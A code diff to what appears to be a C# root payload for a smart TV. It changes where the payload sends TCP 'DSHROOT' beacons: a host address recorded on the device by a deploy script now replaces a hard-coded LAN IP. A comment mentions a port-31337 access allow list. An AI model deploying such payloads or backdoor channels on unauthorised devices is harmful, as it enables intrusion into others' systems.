@@ -20,7 +20,10 @@ internal static class Program
     const string Share = "/opt/usr/home/owner/share";
     const string Marker = Share + "/root_boot.txt";
     const string SysProof = "/opt/usr/system/dsh_root_proof.txt";
+    // Fallback only: deploy.sh records the real PC address in rootchan.host, which
+// HostAddr() prefers. Kept so a hand-built payload still beacons somewhere.
     const string Host = "192.168.178.214";
+    const string HostFile = Share + "/rootchan.host";
     // One IP per line; if the file exists, only those peers may use port 31337.
     const string AllowFile = Share + "/rootchan.allow";
     // Attempt counter for the fast-exit retry loop (v9).  /tmp is tmpfs, so it
@@ -56,13 +59,29 @@ internal static class Program
     static int _fd = -1;
     static readonly Dictionary<uint, IntPtr> Pages = new Dictionary<uint, IntPtr>();
 
+    // Where should beacons go? The address the last deploy recorded on the TV wins over
+// the compiled-in default, so the same payload works on any LAN.
+    static string HostAddr()
+    {
+        try
+        {
+            if (File.Exists(HostFile))
+            {
+                string s = File.ReadAllText(HostFile).Trim();
+                if (s.Length > 0) return s;
+            }
+        }
+        catch { }
+        return Host;
+    }
+
     static string Beacon(string msg)
     {
         try
         {
             using (var c = new TcpClient())
             {
-                c.Connect(Host, 80);
+                c.Connect(HostAddr(), 80);
                 byte[] b = Encoding.UTF8.GetBytes("DSHROOT " + msg + "\n");
                 c.GetStream().Write(b, 0, b.Length);
                 c.GetStream().Flush();
